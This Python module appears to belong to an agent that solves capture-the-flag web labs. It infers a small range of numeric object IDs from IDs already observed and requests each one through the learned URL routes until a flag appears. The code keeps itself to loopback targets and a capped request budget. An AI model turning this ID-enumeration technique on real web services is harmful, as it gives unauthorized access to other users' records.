"""Bounded numeric-prefix exploration for loopback lab agents.

The sweep is activated only after the base agent has already observed at least
three large object identifiers sharing a decimal prefix and a concrete route shape
containing one of those identifiers.  It never expands beyond 1,200 candidates and
inherits LocalLabWebAgent's loopback/same-origin enforcement.
"""
from __future__ import annotations

import re
import urllib.parse

from .local_lab import LocalLabWebAgent, LabSolveResult


_NUM = re.compile(r"\d{3,12}")


def _observed_ids(agent: LocalLabWebAgent) -> tuple[str, ...]:
    out: list[str] = []
    for obs in agent.result.observations:
        for raw in obs.get("numeric_hints", ()):  # provenance: already-returned HTML
            if raw.isdigit() and len(raw) >= 3 and raw not in out:
                out.append(raw)
    return tuple(out)


def _common_prefix(values: tuple[str, ...]) -> str:
    if not values:
        return ""
    prefix = values[0]
    for value in values[1:]:
        while prefix and not value.startswith(prefix):
            prefix = prefix[:-1]
    return prefix


def prefix_space(values: tuple[str, ...], *, max_space: int = 1200) -> tuple[str, ...]:
    """Return the inferred finite decimal space or empty when inference is unsafe."""
    groups: dict[int, list[str]] = {}
    for value in values:
        groups.setdefault(len(value), []).append(value)
    eligible = [tuple(dict.fromkeys(v)) for v in groups.values() if len(set(v)) >= 3]
    if not eligible:
        return ()
    chosen = max(eligible, key=lambda vals: (len(vals), len(vals[0])))
    prefix = _common_prefix(chosen)
    suffix_len = len(chosen[0]) - len(prefix)
    if len(prefix) < 2 or suffix_len < 1 or suffix_len > 3:
        return ()
    size = 10 ** suffix_len
    if size > max_space:
        return ()
    return tuple(prefix + str(i).zfill(suffix_len) for i in range(size))


def _route_templates(agent: LocalLabWebAgent, ids: tuple[str, ...]) -> tuple[str, ...]:
    templates: list[str] = []
    id_set = set(ids)
    for obs in agent.result.observations:
        for raw_url in obs.get("route_hints", ()):
            parsed = urllib.parse.urlparse(raw_url)
            if not parsed.hostname:
                continue
            path = parsed.path
            matches = list(_NUM.finditer(path))
            for match in matches:
                token = match.group(0)
                if token not in id_set:
                    continue
                shaped_path = path[:match.start()] + "{id}" + path[match.end():]
                shaped = urllib.parse.urlunparse(parsed._replace(path=shaped_path))
                if shaped not in templates:
                    templates.append(shaped)
    # Prefer more specific shapes such as /receipt over bare collection paths.
    templates.sort(key=lambda x: (-urllib.parse.urlparse(x).path.count('/'), x))
    return tuple(templates[:8])


def run_prefix_sweep(
    agent: LocalLabWebAgent,
    *,
    max_candidates: int = 1200,
) -> LabSolveResult:
    """Continue an authenticated loopback run through an inferred finite ID space."""
    if agent.result.solved:
        return agent.result
    ids = _observed_ids(agent)
    space = prefix_space(ids, max_space=max_candidates)
    if not space:
        agent.result.notes.append("prefix sweep skipped: no bounded shared ID space")
        return agent.result
    templates = _route_templates(agent, ids)
    if not templates:
        agent.result.notes.append("prefix sweep skipped: no observed object route template")
        return agent.result

    known = set(ids)
    agent.result.notes.append(
        f"prefix sweep inferred {len(space)} candidates from {len(ids)} observed IDs"
    )
    for template in templates:
        # Prove the route shape with a known object first. If all known IDs look like
        # the generic missing-object response, move to the next observed shape.
        baseline_hashes: set[str] = set()
        shape_live = False
        for oid in ids[:4]:
            if agent.result.requests >= agent.max_requests:
                return agent.result
            url = template.replace("{id}", oid)
            _, _, ev = agent._request("GET", url)
            baseline_hashes.add(ev.body_sha256)
            if ev.status < 400:
                shape_live = True
            if agent.result.solved:
                return agent.result
        if not shape_live:
            continue

        for oid in space:
            if oid in known:
                continue
            if agent.result.requests >= agent.max_requests:
                agent.result.notes.append("prefix sweep stopped by request budget")
                return agent.result
            agent.result.id_mutations += 1
            url = template.replace("{id}", oid)
            _, _, ev = agent._request("GET", url)
            if agent.result.solved:
                agent.result.notes.append(f"flag reached by bounded prefix sweep using {template}")
                return agent.result
            # If this route shape is catch-all and never distinguishes objects, do not
            # spend the entire finite space on it; 40 identical misses is enough.
            if agent.result.id_mutations >= 40 and len(baseline_hashes) == 1 and ev.body_sha256 in baseline_hashes:
                break
    if not agent.result.solved:
        agent.result.notes.append("bounded prefix sweep completed without flag")
    return agent.result
